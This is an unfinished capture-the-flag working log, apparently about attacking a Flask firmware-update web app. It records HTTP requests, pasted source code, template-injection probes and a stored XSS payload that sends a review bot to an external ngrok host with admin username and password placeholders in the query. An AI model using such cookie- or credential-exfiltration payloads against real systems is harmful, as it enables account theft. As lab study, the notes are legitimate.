
**Created a user, logged in, found a firmware ‘report’ page where I can raise an issue abuot a firmware
Tried a cookie stealer link but it does not send one
Looked at the source and there is bot going to /review
Tried to use my cookie to go there, but got an unauthorized\.\.
**
GET /review HTTP/1\.1
Host: 138\.68\.188\.223:30696
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0
Accept: text/html,application/xhtml\+xml,application/xml;q=0\.9,image/webp,\*/\*;q=0\.8
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=29d5c8df\-c0d8\-47e1\-95de\-b9c3ab061726
Upgrade\-Insecure\-Requests: 1

**However, noticed that the unauthorized referenced workzeug/python:**

HTTP/1\.1 401 UNAUTHORIZED
Server: Werkzeug/2\.1\.1 Python/3\.10\.0
Date: Mon, 16 May 2022 08:54:33 GMT
Content\-Type: text/html; charset=utf\-8
Content\-Length: 343
Set\-Cookie: session=29d5c8df\-c0d8\-47e1\-95de\-b9c3ab061726; HttpOnly; Path=/

\<\!DOCTYPE HTML PUBLIC "\-//W3C//DTD HTML 3\.2 Final//EN"\>
\<title\>401 Unauthorized\</title\>
\<h1\>Unauthorized\</h1\>
\<p\>The server could not verify that you are authorized to access the URL requested\. You either supplied the wrong credentials \(e\.g\. a bad password\), or your browser doesn\&#x27;t understand how to supply the credentials required\.\</p\>

**So, there are probably flask / jinja / templating bugs here\.\.**

**I can try \{\{ 7 \* 7 \}\} and \{\{ 7 \* ‘7’ \}\} in the report:**

**No way to see this though\.\. I don't think\.\.

Found a route to upload firmware via the API in the code\.\.Probably need to be on as admin though??**

@api\.route\('/firmware/upload', methods=\['POST'\]\)
@login\_required
@is\_admin
def firmware\_update\(\):
if 'file' not in request\.files:
return response\('Missing required parameters\!'\), 401

extraction = extract\_firmware\(request\.files\['file'\]\)
if extraction:
return response\('Firmware update initialized successfully\.'\)

return response\('Something went wrong, please try again\!'\), 403
**
But, we need to be admin\.
Lets see how we could do that\.
**
**/login seems to have an interesting line:
**
@api\.route\('/login', methods=\['POST'\]\)
def user\_login\(\):
if not request\.is\_json:
return response\('Missing required parameters\!'\), 401

data = request\.get\_json\(\)
username = data\.get\('username', ''\)
password = data\.get\('password', ''\)

if not username or not password:
return response\('Missing required parameters\!'\), 401

user = User\.query\.filter\_by\(username=username\)\.first\(\)

if not user or not user\.password == password:
return response\('Invalid username or password\!'\), 403

login\_user\(user\)
return response\('User authenticated successfully\!'\)

**So, the user query seems to filter by username, but returns the \.first\(\) match\.\.
So, if I was using username ‘ad’,  it would still probably find me as a first match for 'admin'\.\.**

user = User\.query\.filter\_by\(username=username\)\.first\(\)

if not user or not user\.password == password:
return response\('Invalid username or password\!'\), 403

**But, I cannot leverage this for anything\.\.**
**Looked at the**‘is\_admin’ **function:**
**So, what is @functools\.wraps\) ??**

def is\_admin\(f\):
@functools\.wraps\(f\)
def wrap\(\*args, \*\*kwargs\):
if current\_user\.username == current\_app\.config\['ADMIN\_USERNAME'\] and request\.remote\_addr == '127\.0\.0\.1':
return f\(\*args, \*\*kwargs\)
else:
return abort\(401\)

return wrap

**Looked this up\.\.

\-\-\-\>functools\.wraps**
**\<\-\-\-**

**Nothing important, just a functional wrapper\.\.

So, I need to somehow leak current\_app\.config\['ADMIN\_USERNAME'\] and set header of REMOTE\_ADDR: 127\.0\.0\.1 to be admin\.\.\.
I might be able to do the former by using a template somewhere, and the latter by using the bot for a cookie on /review maybe??
**
**Tried leaking the admin username/password via the firmware report\.\.**

POST /api/firmware/report HTTP/1\.1
Host: 138\.68\.188\.223:30696
User\-Agent: Mozilla/5\.0 \(Windows NT 10\.0; rv:91\.0\) Gecko/20100101 Firefox/91\.0
Accept: \*/\*
Accept\-Language: en\-US,en;q=0\.5
Accept\-Encoding: gzip, deflate
Referer: [http://138.68.188.223:30696/dashboard](#http://138.68.188.223:30696/dashboard)

Content\-Type: application/json
Origin: [http://138.68.188.223:30696](#http://138.68.188.223:30696)

Content\-Length: 148
DNT: 1
Connection: close
Cookie: session=29d5c8df\-c0d8\-47e1\-95de\-b9c3ab061726

\{"module\_id":"10","issue":"\<script\>document\.location='[https://1dd3-216-93-199-231.ngrok.io/?c={{](#https://1dd3-216-93-199-231.ngrok.io/?c={{)
ADMIN\_USERNAME \}\} \{\{ ADMIN\_PASSWORD \}\}';\</script\>"\}

**However, it just posted them without templating properly\. Of course\.\.**

127\.0\.0\.1 \- \- \[16/May/2022 02:35:02\] "GET /?c=\{\{%20ADMIN\_USERNAME%20\}\}%20\{\{%20ADMIN\_PASSWORD%20\}\} HTTP/1\.1" 404 \-

**Since they are in msg I am not sure if I can use them there\.\. Probably not

Idk, will come back to this tomorrow\.\. too tired to continue**
